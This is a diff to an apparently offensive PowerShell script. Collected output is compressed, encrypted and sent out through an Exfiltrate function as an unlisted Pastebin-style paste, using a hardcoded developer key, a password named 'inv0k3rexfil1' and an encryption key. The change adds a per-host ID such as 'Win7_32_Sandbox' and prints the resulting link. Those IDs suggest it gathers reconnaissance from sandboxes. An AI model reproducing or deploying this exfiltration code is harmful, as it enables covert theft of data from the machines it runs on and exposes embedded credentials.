@@ -544,7 +544,7 @@ function Zend() {
 }
 
 function ZendPasteBin() {
-	Param ($str)
+	Param ($str,$id)
 
     $dev_key = 'c6503f192c60310073d1ec3004e4c206'
     $password = 'inv0k3rexfil1'
@@ -553,7 +553,8 @@ function ZendPasteBin() {
     $Key = "lqZQV1WiMxmK542JitLHds+JZzwrCVG7yA848xSQJ3E="
 
 
-    $compressed, $ok = Exfiltrate -ID "VmwareTest" -Data $str -Key $Key -dev_key $dev_key -visibility "unlisted" -username $username -password $password
+    $info = Exfiltrate -ID $id -Data $str -Key $Key -dev_key $dev_key -visibility "unlisted" -username $username -password $password
+    return $info
 }
 
 function Exfiltrate {
@@ -663,4 +664,5 @@ $out = $out -replace '\\', '\\'
 
 $out = Zcompress $out
 $out = Zencrypt $out
-ZendPasteBin $out
+$link = ZendPasteBin $out "Win7_32_Sandbox"
+Write-Host $link
